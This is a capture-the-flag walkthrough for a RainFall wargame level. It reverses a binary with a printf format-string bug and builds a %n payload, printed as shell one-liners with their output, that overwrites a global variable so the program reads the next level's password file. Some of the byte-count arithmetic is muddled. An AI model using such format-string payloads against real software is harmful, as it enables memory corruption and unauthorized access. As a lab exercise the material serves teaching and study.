# Walkthrough

## Reversing

```c
void main(void)
{
  n();
  return;
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,512,stdin);
  p(local_20c);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void p(char *param_1)
{
  printf(param_1);
  return;
}
```

Same as before but... now `m` needs the value `16930116`, but, we can only
write 512 bytes... But don't worry.

## Exploit

`%n` writes the count of characters written by the format function, that's it,
is dependant on the format string. Since we control the format string, we can
at least take influence on this counter, by writing more or less bytes.

Take the new address of `m`: `08049810`.

So, take the previus payload, remove the previus 'A', and change it so it prints
`16930116` bytes unisg `%u`:
```bash
printf '\x10\x98\x04\x08%%p%%p%%p%%16930087u%%n\n' | ./level4
```

*Note: we need to write 16930116 bytes - 29 bytes that are already been written.*

But there's is still one problem, the internal pointer... We were incrementing
it with `%p`, but now we have another `%u`, so first, let's see how many bytes
we need to increment the pointer so it's on the start of the format string:
```bash
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
```

This time our string is further in the stack, we need to increase the internal
`printf` pointer by 12 * 4 bytes (remember each `%p` is 4 bytes)...

So, know to print our 'A' back, instead of the 3 * 4 bytes we needed to increase
in `level3`, now we need to increase 11 * 4 bytes:
```bash
level4@RainFall:~$ ./level4
AAAA%p%p%p%p%p%p%p%p%p%p%p%c
AAAA0xb7ff26b00xbffff7540xb7fd0ff4(nil)(nil)0xbffff7180x804848d0xbffff5100x2000xb7fd1ac00xb7ff37d0A
```

Cool, but know we are printing 11 `%p`, so instead of 25 bytes, if we count
them, we are printing 94 bytes.

That means, our initial 4 bytes, plus 94, so:
```bash
bc
16930116 - 4 - 94
16930018
```

So, modify the payload accordingly (remove one `%p` because `%u` increments by 4 bytes also, and so add 10 more bytes to the size of `%u`):
```bash
bc
16930018 + 10
16930028
quit

printf '\x10\x98\x04\x08%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%16930028u%%n\n' | ./level4
```

It does not segfault, yeah!

So, we modify our script so we have an interactive session and the `system()`
executes with out problem.

And run it!
```bash
./exploit.sh
```

Take the flag and let's go!

For the sake of science, we can une the `$` modifier with `%n`, but it's boring:
```bash
bc
bc
16930116 - 4
16930112
quit

printf '\x10\x98\x04\x08%%16930112u%%12$n\n' | ./level4
```
